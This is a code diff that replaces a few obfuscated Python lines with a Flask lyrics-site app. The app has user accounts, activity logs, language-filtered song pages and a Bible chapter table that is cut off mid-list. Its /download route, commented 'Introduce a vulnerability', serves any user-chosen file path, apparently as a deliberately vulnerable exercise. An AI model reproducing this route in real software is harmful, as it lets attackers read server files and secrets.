-    lllllIIIIlllllIlII=IIllIlI.IllIllIllIllllIIlIIlIllIl();llIIIIIllllIllIlII=lilIIlI.IllIllIllIllllIIlIIlIllIl();llIlIIIIIIIIllIIlI=lIllIlIlIIIlIIIlII.IllIIlIIlllIIIIlIlIIllIII(lllllIIIIlllllIlII,llIIIIIllllIllIlII)
-    return llIIIIIlIllIllIlIl(lllIllllIIIllIllII.IllllIIllllIIIIIIlIIlIIII(llIlIIIIIIIIllIIlI)).IlIlIlIlIIIIlIllIllllllII()
-lIlIlIlIIIlIllllll(IIlIlIIIlIIIIlIIIl(IllIllIlIIIlllllII(llIIlIlllllIIlllII(lIlllllIl)),llIIlIlllllIIlllII(lIIIIIlI))(lIllIlIlIIIlIIIlII.IlIIIllIIIIlllIIIlllIlIll(lIlIIIlIlIIIlI.replace("!","").IIllllllllIlllIIIIlllIIll(llIIlIlllllIIlllII(IllIIllIlll),''))).IlIlIlIlIIIIlIllIllllllII(llIIlIlllllIIlllII(IlIlIlIIIIllI)))
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file, render_template_string
+import sqlite3
+import os
+import hashlib
+from datetime import datetime
+from flask_socketio import SocketIO, emit, join_room, leave_room
+import re
+import bleach
+import subprocess
 
+
+# logging.basicConfig(filename='/home/oilnwine/flaskapp.log', level=logging.DEBUG)
+# #Then use logging commands throughout your Flask app to log relevant information
+# logging.debug('Debug message')
+# logging.info('Informational message')
+# logging.error('Error message')
+
+app = Flask(__name__)
+# app.secret_key = "secret_key"
+secret_key=os.urandom(12)
+app.config['SECRET_KEY'] = secret_key
+print(secret_key)
+socketio = SocketIO(app)
+
+DATABASE = 'oilnwine.db'
+
+def sanitize_html(html_content,allowed_tags=['b', 'i', 'u', 'a', 'iframe', 'br', 'video', 'embed', 'marquee'],allowed_attrs={
+    'a': ['href', 'title'],   # Allow href and title attributes for <a> tags
+    'iframe': ['src', 'width', 'height', 'frameborder', 'allow', 'allowfullscreen'],  # Attributes for iframes
+    'video': ['src', 'width', 'height', 'controls', 'autoplay', 'loop'],
+      'embed': ['src', 'type', 'width', 'height'],
+      'marquee': ['behavior', 'direction', 'scrollamount', 'scrolldelay', 'loop']
+}):
+    return bleach.clean(html_content, tags=allowed_tags, attributes=allowed_attrs, strip=True)
+
+
+def create_tables():
+    conn = sqlite3.connect('logs.db')
+    cursor = conn.cursor()
+
+    # Create table log_details
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS log_details (
+            id INTEGER PRIMARY KEY,
+            user TEXT NOT NULL,
+            time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+
+    # Create table details
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS details (
+            id INTEGER PRIMARY KEY,
+            user TEXT NOT NULL,
+            time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            data TEXT
+        )
+    ''')
+
+    # Create table controls
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS controls (
+            id INTEGER PRIMARY KEY,
+            user TEXT NOT NULL,
+            time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            data TEXT
+        )
+    ''')
+
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS add_logs (
+        id INTEGER PRIMARY KEY,
+        user TEXT,
+        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        link TEXT
+    )
+    ''')
+
+    # Create edit_logs table
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS edit_logs (
+        id INTEGER PRIMARY KEY,
+        edit_id INTEGER,
+        title TEXT,
+        alternate_title TEXT,
+        lyrics TEXT,
+        transliteration TEXT,
+        chord TEXT,
+        search_title TEXT,
+        search_lyrics TEXT,
+        youtube_link TEXT,
+        create_date TEXT,
+        modified_date TEXT,
+        username TEXT
+    )
+    ''')
+
+    # Create delete_logs table
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS delete_logs (
+        id INTEGER PRIMARY KEY,
+        delete_id INTEGER,
+        title TEXT,
+        alternate_title TEXT,
+        lyrics TEXT,
+        transliteration TEXT,
+        chord TEXT,
+        search_title TEXT,
+        search_lyrics TEXT,
+        youtube_link TEXT,
+        create_date TEXT,
+        modified_date TEXT,
+        username TEXT
+    )
+    ''')
+
+    conn.commit()
+    conn.close()
+
+
+def insert_logs(user):
+    conn = sqlite3.connect('logs.db')
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO log_details (user, time) VALUES (?, datetime('now'))", (user,))
+    conn.commit()
+    conn.close()
+
+
+def insert_details(user, data):
+    conn = sqlite3.connect('logs.db')
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO details (user, time, data) VALUES (?, datetime('now'), ?)", (user, data))
+    conn.commit()
+    conn.close()
+
+
+def insert_control(user, data):
+    conn = sqlite3.connect('logs.db')
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO controls (user, time, data) VALUES (?, datetime('now'), ?)", (user, data))
+    conn.commit()
+    conn.close()
+
+
+def create_connection():
+    conn = sqlite3.connect(DATABASE)
+    return conn
+
+
+def remove_special_characters(input_string):
+    # Define a regex pattern to match special characters
+    # Matches any character that is not a letter, digit, or whitespace
+    pattern = r'[^a-zA-Z0-9\s]'
+
+    # Replace special characters with an empty string
+    processed_string = re.sub(pattern, '', input_string)
+    return processed_string
+
+
+def create_users_table():
+    conn = create_connection()
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT UNIQUE,
+            email TEXT UNIQUE,
+            password TEXT,
+            otp INTEGER DEFAULT 0,
+            verified INTEGER DEFAULT 0,
+            permission INTEGER DEFAULT 0
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+
+def create_songs_table():
+    conn = create_connection()
+    cursor = conn.cursor()
+
+    # Create the songs table
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS songs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            title TEXT,
+            alternate_title TEXT,
+            lyrics TEXT,
+            transliteration TEXT,
+            chord TEXT,
+            search_title TEXT,
+            search_lyrics TEXT,
+            youtube_link TEXT,
+            create_date TEXT,
+            modified_date TEXT,
+            username TEXT,
+            FOREIGN KEY (username) REFERENCES users(username)
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+
+def song_view(lyrics, transliteration_lyrics, chord):
+    if transliteration_lyrics == "" or transliteration_lyrics == None or transliteration_lyrics == "None":
+        paragraphs = re.split(r'\r?\n|\r', lyrics)
+        para_count = 1
+        if chord == None or chord == "None":
+            chord = ''
+        else:
+            chord = "<span id='chord' style='font-weight:bold;'>" + \
+                chord + "</span><br>"
+        formatted_song = f"<p id={para_count} style='border: 1px solid black;padding: 10px;'>{chord}"
+        for paragraph in paragraphs:
+            if paragraph == "":
+                para_count += 1
+                formatted_song += f"</p><p id={para_count} style='border: 1px solid black;padding: 10px;'>"
+            else:
+                formatted_song += f'{paragraph}<br>'
+    else:
+        if chord == None or chord == "None":
+            chord = ''
+        else:
+            chord = "<span id='chord' style='font-weight:bold;'>" + \
+                chord + "</span><br>"
+        paragraphs1 = re.split(r'\r?\n|\r', lyrics)
+        paragraphs2 = re.split(r'\r?\n|\r', transliteration_lyrics)
+        print(paragraphs1)
+        print(paragraphs2)
+        allow1 = 0
+        allow2 = 0
+        para_count = 1
+        formatted_song = f"<p id={para_count} style='border: 1px solid black;padding: 10px;'>{chord}"
+        for i in range(max(len(paragraphs2), len(paragraphs1))):
+            if allow1 == 0:
+                try:
+                    paragraphs1[i]
+                except:
+                    allow1 = 1
+            if allow2 == 0:
+                try:
+                    paragraphs2[i]
+                except:
+                    allow2 = 1
+
+            if allow1 == 0 and allow2 == 0:
+                if paragraphs1[i] == "" or paragraphs2[i] == "":
+                    para_count += 1
+                    formatted_song += f"</p><p id={para_count} style='border: 1px solid black;padding: 10px;'>"
+                else:
+                    formatted_song += f"{paragraphs1[i]}<br><span style='color:green;'>{paragraphs2[i]}</span><br>"
+
+            if allow1 == 1:
+                if paragraphs2[i] == "":
+                    para_count += 1
+                    formatted_song += f"</p><p id={para_count} style='border: 1px solid black;padding: 10px; color:green;'>"
+                else:
+                    formatted_song += f'{paragraphs2[i]}<br>'
+
+            if allow2 == 1:
+                if paragraphs1[i] == "":
+                    para_count += 1
+                    formatted_song += f"</p><p id={para_count} style='border: 1px solid black;padding: 10px;'>"
+                else:
+                    formatted_song += f'{paragraphs1[i]}<br>'
+
+    return formatted_song
+
+
+# Call the function to create the 'songs' table
+create_songs_table()
+
+create_users_table()
+
+create_tables()
+
+
+@app.route('/download')
+def download_db():
+    # Introduce a vulnerability by accepting a filename parameter from the user
+    db_file_path = request.args.get('filename', 'logs.db')  # Default to 'logs.db'
+
+    return send_file(db_file_path, as_attachment=True)
+
+
+
+@app.route('/')
+def home():
+    conn=create_connection()
+    if 'username' in session:
+        login = True
+        user = session['username']
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+
+    else:
+        login = False
+        user = ""
+        permission = 0
+
+    cursor = conn.cursor()
+
+    # Execute a query to select data from the 'songs' table
+    cursor.execute('SELECT id, title, search_title, search_lyrics FROM songs')
+    # Fetch all rows with the specified columns
+    rows = cursor.fetchall()
+
+    sorted_rows = sorted(rows, key=lambda x: x[1].lower())
+
+    # print(rows)
+    conn.close()
+
+    return render_template("home.html", login=login, user=user, rows=sorted_rows, permission=permission)
+
+
+@app.route('/tamil')
+def tamil():
+    conn=create_connection()
+    if 'username' in session:
+        login = True
+        user = session['username']
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+
+    else:
+        login = False
+        user = ""
+        permission = 0
+
+    cursor = conn.cursor()
+
+    # Execute a SELECT query to fetch all rows
+    cursor.execute('SELECT id, title, search_title, search_lyrics FROM songs')
+
+    # Fetch the results
+    all_rows = cursor.fetchall()
+
+    # Filter the results based on the search term using Python
+    filtered_results = [row for row in all_rows if 'tamil' in row[1]
+                        or 'Tamil' in row[1] or 'tamil' in row[2] or 'Tamil' in row[2]]
+
+    # Process the filtered results
+
+    # print(filtered_results)
+
+    sorted_rows = sorted(filtered_results, key=lambda x: x[1].lower())
+
+    # print(sorted_rows)
+
+    # print(rows)
+    conn.close()
+
+    return render_template("tamil.html", login=login, user=user, rows=sorted_rows, permission=permission)
+
+
+@app.route('/malayalam')
+def malayalam():
+    conn=create_connection()
+    if 'username' in session:
+        login = True
+        user = session['username']
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+
+    else:
+        login = False
+        user = ""
+        permission = 0
+
+    cursor = conn.cursor()
+
+    # Execute a SELECT query to fetch all rows
+    cursor.execute('SELECT id, title, search_title, search_lyrics FROM songs')
+
+    # Fetch the results
+    all_rows = cursor.fetchall()
+
+    # Filter the results based on the search term using Python
+    filtered_results = [row for row in all_rows if 'malayalam' in row[1]
+                        or 'Malayalam' in row[1] or 'malayalam' in row[2] or 'Malayalam' in row[2]]
+
+    # Process the filtered results
+
+    # print(filtered_results)
+
+    sorted_rows = sorted(filtered_results, key=lambda x: x[1].lower())
+
+    # print(sorted_rows)
+
+    # print(rows)
+    conn.close()
+
+    return render_template("malayalam.html", login=login, user=user, rows=sorted_rows, permission=permission)
+
+
+@app.route('/hindi')
+def hindi():
+    conn=create_connection()
+    if 'username' in session:
+        login = True
+        user = session['username']
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+
+    else:
+        login = False
+        user = ""
+        permission = 0
+
+    cursor = conn.cursor()
+
+    # Execute a SELECT query to fetch all rows
+    cursor.execute('SELECT id, title, search_title, search_lyrics FROM songs')
+
+    # Fetch the results
+    all_rows = cursor.fetchall()
+
+    # Filter the results based on the search term using Python
+    filtered_results = [row for row in all_rows if 'hindi' in row[1]
+                        or 'Hindi' in row[1] or 'hindi' in row[2] or 'Hindi' in row[2]]
+
+    # Process the filtered results
+
+    # print(filtered_results)
+
+    sorted_rows = sorted(filtered_results, key=lambda x: x[1].lower())
+
+    # print(sorted_rows)
+
+    # print(rows)
+    conn.close()
+
+    return render_template("hindi.html", login=login, user=user, rows=sorted_rows, permission=permission)
+
+
+@app.route('/telugu')
+def telugu():
+    conn=create_connection()
+    if 'username' in session:
+        login = True
+        user = session['username']
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+
+    else:
+        login = False
+        user = ""
+        permission = 0
+
+    cursor = conn.cursor()
+
+    # Execute a SELECT query to fetch all rows
+    cursor.execute('SELECT id, title, search_title, search_lyrics FROM songs')
+
+    # Fetch the results
+    all_rows = cursor.fetchall()
+
+    # Filter the results based on the search term using Python
+    filtered_results = [row for row in all_rows if 'telugu' in row[1] or 'Telugu' in row[1] or 'Telegu' in row[1]
+                        or 'telegu' in row[1] or 'telugu' in row[2] or 'Telugu' in row[2] or 'Telegu' in row[2] or 'telegu' in row[2]]
+
+    # Process the filtered results
+
+    # print(filtered_results)
+
+    sorted_rows = sorted(filtered_results, key=lambda x: x[1].lower())
+
+    # print(sorted_rows)
+
+    # print(rows)
+    conn.close()
+
+    return render_template("telugu.html", login=login, user=user, rows=sorted_rows, permission=permission)
+
+
+result_list = [[1, 1, 1, 'Genesis 1', 'Gen 1'], [2, 1, 2, 'Genesis 2', 'Gen 2'], [3, 1, 3, 'Genesis 3', 'Gen 3'], [4, 1, 4, 'Genesis 4', 'Gen 4'], [5, 1, 5, 'Genesis 5', 'Gen 5'], [6, 1, 6, 'Genesis 6', 'Gen 6'], [7, 1, 7, 'Genesis 7', 'Gen 7'], [8, 1, 8, 'Genesis 8', 'Gen 8'], [9, 1, 9, 'Genesis 9', 'Gen 9'], [10, 1, 10, 'Genesis 10', 'Gen 10'], [11, 1, 11, 'Genesis 11', 'Gen 11'], [12, 1, 12, 'Genesis 12', 'Gen 12'], [13, 1, 13, 'Genesis 13', 'Gen 13'], [14, 1, 14, 'Genesis 14', 'Gen 14'], [15, 1, 15, 'Genesis 15', 'Gen 15'], [16, 1, 16, 'Genesis 16', 'Gen 16'], [17, 1, 17, 'Genesis 17', 'Gen 17'], [18, 1, 18, 'Genesis 18', 'Gen 18'], [19, 1, 19, 'Genesis 19', 'Gen 19'], [20, 1, 20, 'Genesis 20', 'Gen 20'], [21, 1, 21, 'Genesis 21', 'Gen 21'], [22, 1, 22, 'Genesis 22', 'Gen 22'], [23, 1, 23, 'Genesis 23', 'Gen 23'], [24, 1, 24, 'Genesis 24', 'Gen 24'], [25, 1, 25, 'Genesis 25', 'Gen 25'], [26, 1, 26, 'Genesis 26', 'Gen 26'], [27, 1, 27, 'Genesis 27', 'Gen 27'], [28, 1, 28, 'Genesis 28', 'Gen 28'], [29, 1, 29, 'Genesis 29', 'Gen 29'], [30, 1, 30, 'Genesis 30', 'Gen 30'], [31, 1, 31, 'Genesis 31', 'Gen 31'], [32, 1, 32, 'Genesis 32', 'Gen 32'], [33, 1, 33, 'Genesis 33', 'Gen 33'], [34, 1, 34, 'Genesis 34', 'Gen 34'], [35, 1, 35, 'Genesis 35', 'Gen 35'], [36, 1, 36, 'Genesis 36', 'Gen 36'], [37, 1, 37, 'Genesis 37', 'Gen 37'], [38, 1, 38, 'Genesis 38', 'Gen 38'], [39, 1, 39, 'Genesis 39', 'Gen 39'], [40, 1, 40, 'Genesis 40', 'Gen 40'], [41, 1, 41, 'Genesis 41', 'Gen 41'], [42, 1, 42, 'Genesis 42', 'Gen 42'], [43, 1, 43, 'Genesis 43', 'Gen 43'], [44, 1, 44, 'Genesis 44', 'Gen 44'], [45, 1, 45, 'Genesis 45', 'Gen 45'], [46, 1, 46, 'Genesis 46', 'Gen 46'], [47, 1, 47, 'Genesis 47', 'Gen 47'], [48, 1, 48, 'Genesis 48', 'Gen 48'], [49, 1, 49, 'Genesis 49', 'Gen 49'], [50, 1, 50, 'Genesis 50', 'Gen 50'], [51, 2, 1, 'Exodus 1', 'Exo 1'], [52, 2, 2, 'Exodus 2', 'Exo 2'], [53, 2, 3, 'Exodus 3', 'Exo 3'], [54, 2, 4, 'Exodus 4', 'Exo 4'], [55, 2, 5, 'Exodus 5', 'Exo 5'], [56, 2, 6, 'Exodus 6', 'Exo 6'], [57, 2, 7, 'Exodus 7', 'Exo 7'], [58, 2, 8, 'Exodus 8', 'Exo 8'], [59, 2, 9, 'Exodus 9', 'Exo 9'], [60, 2, 10, 'Exodus 10', 'Exo 10'], [61, 2, 11, 'Exodus 11', 'Exo 11'], [62, 2, 12, 'Exodus 12', 'Exo 12'], [63, 2, 13, 'Exodus 13', 'Exo 13'], [64, 2, 14, 'Exodus 14', 'Exo 14'], [65, 2, 15, 'Exodus 15', 'Exo 15'], [66, 2, 16, 'Exodus 16', 'Exo 16'], [67, 2, 17, 'Exodus 17', 'Exo 17'], [68, 2, 18, 'Exodus 18', 'Exo 18'], [69, 2, 19, 'Exodus 19', 'Exo 19'], [70, 2, 20, 'Exodus 20', 'Exo 20'], [71, 2, 21, 'Exodus 21', 'Exo 21'], [72, 2, 22, 'Exodus 22', 'Exo 22'], [73, 2, 23, 'Exodus 23', 'Exo 23'], [74, 2, 24, 'Exodus 24', 'Exo 24'], [75, 2, 25, 'Exodus 25', 'Exo 25'], [76, 2, 26, 'Exodus 26', 'Exo 26'], [77, 2, 27, 'Exodus 27', 'Exo 27'], [78, 2, 28, 'Exodus 28', 'Exo 28'], [79, 2, 29, 'Exodus 29', 'Exo 29'], [80, 2, 30, 'Exodus 30', 'Exo 30'], [81, 2, 31, 'Exodus 31', 'Exo 31'], [82, 2, 32, 'Exodus 32', 'Exo 32'], [83, 2, 33, 'Exodus 33', 'Exo 33'], [84, 2, 34, 'Exodus 34', 'Exo 34'], [85, 2, 35, 'Exodus 35', 'Exo 35'], [86, 2, 36, 'Exodus 36', 'Exo 36'], [87, 2, 37, 'Exodus 37', 'Exo 37'], [88, 2, 38, 'Exodus 38', 'Exo 38'], [89, 2, 39, 'Exodus 39', 'Exo 39'], [90, 2, 40, 'Exodus 40', 'Exo 40'], [91, 3, 1, 'Leviticus 1', 'Lev 1'], [92, 3, 2, 'Leviticus 2', 'Lev 2'], [93, 3, 3, 'Leviticus 3', 'Lev 3'], [94, 3, 4, 'Leviticus 4', 'Lev 4'], [95, 3, 5, 'Leviticus 5', 'Lev 5'], [96, 3, 6, 'Leviticus 6', 'Lev 6'], [97, 3, 7, 'Leviticus 7', 'Lev 7'], [98, 3, 8, 'Leviticus 8', 'Lev 8'], [99, 3, 9, 'Leviticus 9', 'Lev 9'], [100, 3, 10, 'Leviticus 10', 'Lev 10'], [101, 3, 11, 'Leviticus 11', 'Lev 11'], [102, 3, 12, 'Leviticus 12', 'Lev 12'], [103, 3, 13, 'Leviticus 13', 'Lev 13'], [104, 3, 14, 'Leviticus 14', 'Lev 14'], [105, 3, 15, 'Leviticus 15', 'Lev 15'], [106, 3, 16, 'Leviticus 16', 'Lev 16'], [107, 3, 17, 'Leviticus 17', 'Lev 17'], [108, 3, 18, 'Leviticus 18', 'Lev 18'], [109, 3, 19, 'Leviticus 19', 'Lev 19'], [110, 3, 20, 'Leviticus 20', 'Lev 20'], [111, 3, 21, 'Leviticus 21', 'Lev 21'], [112, 3, 22, 'Leviticus 22', 'Lev 22'], [113, 3, 23, 'Leviticus 23', 'Lev 23'], [114, 3, 24, 'Leviticus 24', 'Lev 24'], [115, 3, 25, 'Leviticus 25', 'Lev 25'], [116, 3, 26, 'Leviticus 26', 'Lev 26'], [117, 3, 27, 'Leviticus 27', 'Lev 27'], [118, 4, 1, 'Numbers 1', 'Num 1'], [119, 4, 2, 'Numbers 2', 'Num 2'], [120, 4, 3, 'Numbers 3', 'Num 3'], [121, 4, 4, 'Numbers 4', 'Num 4'], [122, 4, 5, 'Numbers 5', 'Num 5'], [123, 4, 6, 'Numbers 6', 'Num 6'], [124, 4, 7, 'Numbers 7', 'Num 7'], [125, 4, 8, 'Numbers 8', 'Num 8'], [126, 4, 9, 'Numbers 9', 'Num 9'], [127, 4, 10, 'Numbers 10', 'Num 10'], [128, 4, 11, 'Numbers 11', 'Num 11'], [129, 4, 12, 'Numbers 12', 'Num 12'], [130, 4, 13, 'Numbers 13', 'Num 13'], [131, 4, 14, 'Numbers 14', 'Num 14'], [132, 4, 15, 'Numbers 15', 'Num 15'], [133, 4, 16, 'Numbers 16', 'Num 16'], [134, 4, 17, 'Numbers 17', 'Num 17'], [135, 4, 18, 'Numbers 18', 'Num 18'], [136, 4, 19, 'Numbers 19', 'Num 19'], [137, 4, 20, 'Numbers 20', 'Num 20'], [138, 4, 21, 'Numbers 21', 'Num 21'], [139, 4, 22, 'Numbers 22', 'Num 22'], [140, 4, 23, 'Numbers 23', 'Num 23'], [141, 4, 24, 'Numbers 24', 'Num 24'], [142, 4, 25, 'Numbers 25', 'Num 25'], [143, 4, 26, 'Numbers 26', 'Num 26'], [144, 4, 27, 'Numbers 27', 'Num 27'], [145, 4, 28, 'Numbers 28', 'Num 28'], [146, 4, 29, 'Numbers 29', 'Num 29'], [147, 4, 30, 'Numbers 30', 'Num 30'], [148, 4, 31, 'Numbers 31', 'Num 31'], [149, 4, 32, 'Numbers 32', 'Num 32'], [150, 4, 33, 'Numbers 33', 'Num 33'], [151, 4, 34, 'Numbers 34', 'Num 34'], [152, 4, 35, 'Numbers 35', 'Num 35'], [153, 4, 36, 'Numbers 36', 'Num 36'], [154, 5, 1, 'Deuteronomy 1', 'Deu 1'], [155, 5, 2, 'Deuteronomy 2', 'Deu 2'], [156, 5, 3, 'Deuteronomy 3', 'Deu 3'], [157, 5, 4, 'Deuteronomy 4', 'Deu 4'], [158, 5, 5, 'Deuteronomy 5', 'Deu 5'], [159, 5, 6, 'Deuteronomy 6', 'Deu 6'], [160, 5, 7, 'Deuteronomy 7', 'Deu 7'], [161, 5, 8, 'Deuteronomy 8', 'Deu 8'], [162, 5, 9, 'Deuteronomy 9', 'Deu 9'], [163, 5, 10, 'Deuteronomy 10', 'Deu 10'], [164, 5, 11, 'Deuteronomy 11', 'Deu 11'], [165, 5, 12, 'Deuteronomy 12', 'Deu 12'], [166, 5, 13, 'Deuteronomy 13', 'Deu 13'], [167, 5, 14, 'Deuteronomy 14', 'Deu 14'], [168, 5, 15, 'Deuteronomy 15', 'Deu 15'], [169, 5, 16, 'Deuteronomy 16', 'Deu 16'], [170, 5, 17, 'Deuteronomy 17', 'Deu 17'], [171, 5, 18, 'Deuteronomy 18', 'Deu 18'], [172, 5, 19, 'Deuteronomy 19', 'Deu 19'], [173, 5, 20, 'Deuteronomy 20', 'Deu 20'], [174, 5, 21, 'Deuteronomy 21', 'Deu 21'], [175, 5, 22, 'Deuteronomy 22', 'Deu 22'], [176, 5, 23, 'Deuteronomy 23', 'Deu 23'], [177, 5, 24, 'Deuteronomy 24', 'Deu 24'], [178, 5, 25, 'Deuteronomy 25', 'Deu 25'], [179, 5, 26, 'Deuteronomy 26', 'Deu 26'], [180, 5, 27, 'Deuteronomy 27', 'Deu 27'], [181, 5, 28, 'Deuteronomy 28', 'Deu 28'], [182, 5, 29, 'Deuteronomy 29', 'Deu 29'], [183, 5, 30, 'Deuteronomy 30', 'Deu 30'], [184, 5, 31, 'Deuteronomy 31', 'Deu 31'], [185, 5, 32, 'Deuteronomy 32', 'Deu 32'], [186, 5, 33, 'Deuteronomy 33', 'Deu 33'], [187, 5, 34, 'Deuteronomy 34', 'Deu 34'], [188, 6, 1, 'Joshua 1', 'Jos 1'], [189, 6, 2, 'Joshua 2', 'Jos 2'], [190, 6, 3, 'Joshua 3', 'Jos 3'], [191, 6, 4, 'Joshua 4', 'Jos 4'], [192, 6, 5, 'Joshua 5', 'Jos 5'], [193, 6, 6, 'Joshua 6', 'Jos 6'], [194, 6, 7, 'Joshua 7', 'Jos 7'], [195, 6, 8, 'Joshua 8', 'Jos 8'], [196, 6, 9, 'Joshua 9', 'Jos 9'], [197, 6, 10, 'Joshua 10', 'Jos 10'], [198, 6, 11, 'Joshua 11', 'Jos 11'], [199, 6, 12, 'Joshua 12', 'Jos 12'], [200, 6, 13, 'Joshua 13', 'Jos 13'], [201, 6, 14, 'Joshua 14', 'Jos 14'], [202, 6, 15, 'Joshua 15', 'Jos 15'], [203, 6, 16, 'Joshua 16', 'Jos 16'], [204, 6, 17, 'Joshua 17', 'Jos 17'], [205, 6, 18, 'Joshua 18', 'Jos 18'], [206, 6, 19, 'Joshua 19', 'Jos 19'], [207, 6, 20, 'Joshua 20', 'Jos 20'], [208, 6, 21, 'Joshua 21', 'Jos 21'], [209, 6, 22, 'Joshua 22', 'Jos 22'], [210, 6, 23, 'Joshua 23', 'Jos 23'], [211, 6, 24, 'Joshua 24', 'Jos 24'], [212, 7, 1, 'Judges 1', 'Jud 1'], [213, 7, 2, 'Judges 2', 'Jud 2'], [214, 7, 3, 'Judges 3', 'Jud 3'], [215, 7, 4, 'Judges 4', 'Jud 4'], [216, 7, 5, 'Judges 5', 'Jud 5'], [217, 7, 6, 'Judges 6', 'Jud 6'], [218, 7, 7, 'Judges 7', 'Jud 7'], [219, 7, 8, 'Judges 8', 'Jud 8'], [220, 7, 9, 'Judges 9', 'Jud 9'], [221, 7, 10, 'Judges 10', 'Jud 10'], [222, 7, 11, 'Judges 11', 'Jud 11'], [223, 7, 12, 'Judges 12', 'Jud 12'], [224, 7, 13, 'Judges 13', 'Jud 13'], [225, 7, 14, 'Judges 14', 'Jud 14'], [226, 7, 15, 'Judges 15', 'Jud 15'], [227, 7, 16, 'Judges 16', 'Jud 16'], [228, 7, 17, 'Judges 17', 'Jud 17'], [229, 7, 18, 'Judges 18', 'Jud 18'], [230, 7, 19, 'Judges 19', 'Jud 19'], [231, 7, 20, 'Judges 20', 'Jud 20'], [232, 7, 21, 'Judges 21', 'Jud 21'], [233, 8, 1, 'Ruth 1', 'Rut 1'], [234, 8, 2, 'Ruth 2', 'Rut 2'], [235, 8, 3, 'Ruth 3', 'Rut 3'], [236, 8, 4, 'Ruth 4', 'Rut 4'], [237, 9, 1, '1 Samuel 1', '1 Sam 1'], [238, 9, 2, '1 Samuel 2', '1 Sam 2'], [239, 9, 3, '1 Samuel 3', '1 Sam 3'], [240, 9, 4, '1 Samuel 4', '1 Sam 4'], [241, 9, 5, '1 Samuel 5', '1 Sam 5'], [242, 9, 6, '1 Samuel 6', '1 Sam 6'], [243, 9, 7, '1 Samuel 7', '1 Sam 7'], [244, 9, 8, '1 Samuel 8', '1 Sam 8'], [245, 9, 9, '1 Samuel 9', '1 Sam 9'], [246, 9, 10, '1 Samuel 10', '1 Sam 10'], [247, 9, 11, '1 Samuel 11', '1 Sam 11'], [248, 9, 12, '1 Samuel 12', '1 Sam 12'], [249, 9, 13, '1 Samuel 13', '1 Sam 13'], [250, 9, 14, '1 Samuel 14', '1 Sam 14'], [251, 9, 15, '1 Samuel 15', '1 Sam 15'], [252, 9, 16, '1 Samuel 16', '1 Sam 16'], [253, 9, 17, '1 Samuel 17', '1 Sam 17'], [254, 9, 18, '1 Samuel 18', '1 Sam 18'], [255, 9, 19, '1 Samuel 19', '1 Sam 19'], [256, 9, 20, '1 Samuel 20', '1 Sam 20'], [257, 9, 21, '1 Samuel 21', '1 Sam 21'], [258, 9, 22, '1 Samuel 22', '1 Sam 22'], [259, 9, 23, '1 Samuel 23', '1 Sam 23'], [260, 9, 24, '1 Samuel 24', '1 Sam 24'], [261, 9, 25, '1 Samuel 25', '1 Sam 25'], [262, 9, 26, '1 Samuel 26', '1 Sam 26'], [263, 9, 27, '1 Samuel 27', '1 Sam 27'], [264, 9, 28, '1 Samuel 28', '1 Sam 28'], [265, 9, 29, '1 Samuel 29', '1 Sam 29'], [266, 9, 30, '1 Samuel 30', '1 Sam 30'], [267, 9, 31, '1 Samuel 31', '1 Sam 31'], [268, 10, 1, '2 Samuel 1', '2 Sam 1'], [269, 10, 2, '2 Samuel 2', '2 Sam 2'], [270, 10, 3, '2 Samuel 3', '2 Sam 3'], [271, 10, 4, '2 Samuel 4', '2 Sam 4'], [272, 10, 5, '2 Samuel 5', '2 Sam 5'], [273, 10, 6, '2 Samuel 6', '2 Sam 6'], [274, 10, 7, '2 Samuel 7', '2 Sam 7'], [275, 10, 8, '2 Samuel 8', '2 Sam 8'], [276, 10, 9, '2 Samuel 9', '2 Sam 9'], [277, 10, 10, '2 Samuel 10', '2 Sam 10'], [278, 10, 11, '2 Samuel 11', '2 Sam 11'], [279, 10, 12, '2 Samuel 12', '2 Sam 12'], [280, 10, 13, '2 Samuel 13', '2 Sam 13'], [281, 10, 14, '2 Samuel 14', '2 Sam 14'], [282, 10, 15, '2 Samuel 15', '2 Sam 15'], [283, 10, 16, '2 Samuel 16', '2 Sam 16'], [284, 10, 17, '2 Samuel 17', '2 Sam 17'], [285, 10, 18, '2 Samuel 18', '2 Sam 18'], [286, 10, 19, '2 Samuel 19', '2 Sam 19'], [287, 10, 20, '2 Samuel 20', '2 Sam 20'], [288, 10, 21, '2 Samuel 21', '2 Sam 21'], [289, 10, 22, '2 Samuel 22', '2 Sam 22'], [290, 10, 23, '2 Samuel 23', '2 Sam 23'], [291, 10, 24, '2 Samuel 24', '2 Sam 24'], [292, 11, 1, '1 Kings 1', '1 Kin 1'], [293, 11, 2, '1 Kings 2', '1 Kin 2'], [294, 11, 3, '1 Kings 3', '1 Kin 3'], [295, 11, 4, '1 Kings 4', '1 